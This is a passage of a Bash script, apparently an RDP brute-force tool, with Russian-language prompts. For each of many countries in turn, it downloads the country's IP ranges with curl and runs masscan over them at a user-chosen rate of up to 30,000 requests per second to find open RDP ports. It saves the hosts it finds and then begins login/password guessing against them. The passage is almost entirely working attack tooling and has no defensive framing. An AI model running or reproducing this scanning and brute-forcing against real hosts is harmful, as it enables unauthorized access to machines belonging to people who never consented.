trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "64" ]; then
curl http://ipdiapazon.16mb.com/French_guiana.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "65" ]; then
curl http://ipdiapazon.16mb.com/French_polynesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "66" ]; then
curl http://ipdiapazon.16mb.com/Gabon.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "67" ]; then
curl http://ipdiapazon.16mb.com/Gambia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "68" ]; then
curl http://ipdiapazon.16mb.com/Georgia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "69" ]; then
curl http://ipdiapazon.16mb.com/Germany.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "70" ]; then
curl http://ipdiapazon.16mb.com/Ghana.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "71" ]; then
curl http://ipdiapazon.16mb.com/Gibraltar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "72" ]; then
curl http://ipdiapazon.16mb.com/Greece.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "73" ]; then
curl http://ipdiapazon.16mb.com/Greenland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "74" ]; then
curl http://ipdiapazon.16mb.com/Grenada.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "75" ]; then
curl http://ipdiapazon.16mb.com/Guam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "76" ]; then
curl http://ipdiapazon.16mb.com/Guatemala.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "77" ]; then
curl http://ipdiapazon.16mb.com/Guinea-bissau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "78" ]; then
curl http://ipdiapazon.16mb.com/Haiti.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "79" ]; then
curl http://ipdiapazon.16mb.com/Holy_see.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "80" ]; then
curl http://ipdiapazon.16mb.com/Honduras.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "81" ]; then
curl http://ipdiapazon.16mb.com/Hong_kong.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
